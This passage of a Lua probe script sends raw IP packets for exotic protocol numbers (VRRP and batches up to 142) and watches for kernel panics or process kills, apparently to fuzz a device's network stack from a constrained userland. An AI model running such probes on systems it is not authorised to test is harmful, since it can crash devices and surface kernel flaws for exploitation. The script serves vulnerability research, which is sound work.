    safe_wb(buf + off + 5, 1)    -- adver interval
    safe_ww(buf + off + 6, 0)    -- checksum
    -- IP address(es)
    safe_wb(buf + off + 8, 10); safe_wb(buf + off + 9, 0)
    safe_wb(buf + off + 10, 0);  safe_wb(buf + off + 11, 1)
    return 12
end, "H7 VRRP")
print("  H7: VRRP advertisement: sent")

-- H8: Batch — send 1 packet each for protocols 3-7 (GGP, IPENCAP, ST, TCP, CBT)
for proto = 3, 7 do
    send_raw_ip(proto, function(buf, off)
        for i = 0, 15 do safe_wb(buf + off + i, proto) end
        return 16
    end, "H8 proto " .. proto)
end
print("  H8: Protocols 3-7 (GGP/IPENCAP/ST/TCP/CBT): sent")

-- H9: Batch — protocols 9-15 (IGP, BBN-RCC, NVP, PUP, ARGUS, EMCON, XNET)
for proto = 9, 15 do
    send_raw_ip(proto, function(buf, off)
        for i = 0, 15 do safe_wb(buf + off + i, proto) end
        return 16
    end, "H9 proto " .. proto)
end
print("  H9: Protocols 9-15: sent")

-- H10: Batch — higher numbered protocols 60-70
for proto = 60, 70 do
    send_raw_ip(proto, function(buf, off)
        for i = 0, 15 do safe_wb(buf + off + i, proto) end
        return 16
    end, "H10 proto " .. proto)
end
print("  H10: Protocols 60-70: sent")

-- H11: Batch — protocols 130-142 (near the edge of tested range from 48a)
for proto = 130, 142 do
    send_raw_ip(proto, function(buf, off)
        for i = 0, 15 do safe_wb(buf + off + i, proto) end
        return 16
    end, "H11 proto " .. proto)
end
print("  H11: Protocols 130-142: sent")

print("")

-- ============================================
-- Cleanup
-- ============================================
if raw_fd then pcall(function() sc_close(uint64(raw_fd)) end) end

print("=== PROBE 50a COMPLETE ===")
print("Total packets sent: " .. sent)
print("Send errors: " .. errors)
print("")
print("KEY: If you are reading this, the process survived all " .. sent .. " exotic")
print("protocol packets. The kernel handled IGMP, GRE, ESP, AH, PIM, OSPF,")
print("VRRP, IP-in-IP, IPv6-in-IPv4, and batch protocol sweeps without crashing.")
print("")
print("LOOK FOR: kernel panic, process kill, or unexpected behavior.")
